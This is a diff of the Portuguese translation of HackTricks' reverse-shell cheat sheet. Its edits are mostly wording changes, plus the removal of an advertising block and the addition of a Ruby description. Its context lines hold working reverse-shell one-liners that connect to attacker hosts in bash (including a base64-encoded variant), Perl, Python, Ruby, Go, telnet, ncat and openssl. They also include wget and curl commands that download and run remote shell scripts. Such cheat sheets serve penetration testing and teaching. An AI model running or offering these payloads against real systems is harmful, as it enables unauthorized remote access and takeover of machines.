@@ -2,23 +2,23 @@
 
 <details>
 
-<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 
-**Se você tiver dúvidas sobre algum desses shells, você pode verificá-los em** [**https://explainshell.com/**](https://explainshell.com)
+**Se você tiver dúvidas sobre algum desses shells, você pode verificá-los com** [**https://explainshell.com/**](https://explainshell.com)
 
 ## TTY Completo
 
-**Depois de obter um shell reverso**[ **leia esta página para obter um TTY completo**](full-ttys.md)**.**
+**Uma vez que você obtiver um shell reverso**[ **leia esta página para obter um TTY completo**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -46,7 +46,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Explicação do Shell
 
-1. **`bash -i`**: Esta parte do comando inicia um shell interativo (`-i`) do Bash.
+1. **`bash -i`**: Esta parte do comando inicia um shell Bash interativo (`-i`).
 2. **`>&`**: Esta parte do comando é uma notação abreviada para **redirecionar tanto a saída padrão** (`stdout`) quanto o **erro padrão** (`stderr`) para o **mesmo destino**.
 3. **`/dev/tcp/<IP-DO-ATAQUE>/<PORTA>`**: Este é um arquivo especial que **representa uma conexão TCP com o endereço IP e porta especificados**.
 * Ao **redirecionar os fluxos de saída e erro para este arquivo**, o comando envia efetivamente a saída da sessão do shell interativo para a máquina do atacante.
@@ -59,7 +59,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Shell Avançado
 
-Se você encontrar uma **vulnerabilidade RCE** em um aplicativo da web baseado em Linux, pode haver casos em que **obter um shell reverso se torne difícil** devido à presença de regras do Iptables ou outros filtros. Em tais cenários, considere criar um shell PTY dentro do sistema comprometido usando pipes.
+Se você encontrar uma **vulnerabilidade RCE** em um aplicativo da web baseado em Linux, pode haver casos em que **obter um shell reverso se torne difícil** devido à presença de regras Iptables ou outros filtros. Em tais cenários, considere criar um shell PTY dentro do sistema comprometido usando pipes.
 
 Você pode encontrar o código em [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
 
@@ -67,7 +67,7 @@ Você só precisa modificar:
 
 * A URL do host vulnerável
 * O prefixo e sufixo de sua carga útil (se houver)
-* A maneira como a carga útil é enviada (cabeçalhos? dados? informações extras?)
+* A forma como a carga útil é enviada (cabeçalhos? dados? informações extras?)
 
 Então, você pode simplesmente **enviar comandos** ou até mesmo **usar o comando `upgrade`** para obter um PTY completo (observe que os pipes são lidos e escritos com um atraso aproximado de 1,3s).
 
@@ -87,7 +87,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet é um protocolo de rede que permite a comunicação remota com um dispositivo usando um prompt de comando. É comumente usado para acessar e gerenciar dispositivos de rede, como roteadores e switches.
+Telnet é um protocolo de rede que permite a comunicação remota com um dispositivo usando um prompt de comando. É comumente usado para acessar e gerenciar dispositivos de rede.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -116,12 +116,14 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl is a high-level, general-purpose, interpreted programming language known for its flexibility and powerful text processing capabilities. It is commonly used for system administration tasks, web development, and network programming. Perl scripts can be used to create powerful one-liners for various tasks, making it a versatile tool for hackers.
+Perl é uma linguagem de programação versátil e poderosa que é frequentemente usada para escrever scripts de shell. Com sua sintaxe flexível e recursos avançados, o Perl é uma escolha popular para tarefas de automação e manipulação de texto no Linux.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
+
+Ruby is a dynamic, open source programming language with a focus on simplicity and productivity. It has an elegant syntax that is easy to read and write. Ruby is often used for web development and is known for its Rails framework, which makes building web applications faster and easier.
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -149,14 +151,6 @@ p.waitFor()
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
-<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Encontre vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## Golang
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
@@ -231,7 +225,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Shell de Conexão
+### Shell de Ligação
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
@@ -321,6 +315,6 @@ Outras formas de apoiar o HackTricks:
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
